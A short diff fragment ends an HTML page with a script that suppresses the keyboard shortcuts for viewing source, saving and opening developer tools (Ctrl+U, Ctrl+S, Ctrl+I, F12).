+            document.addEventListener("keydown", e => {
+                if(e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) e.preventDefault();
+                if(e.key === 'F12') e.preventDefault();
+            });
+        }
+    </script>
+</body>
+</html>
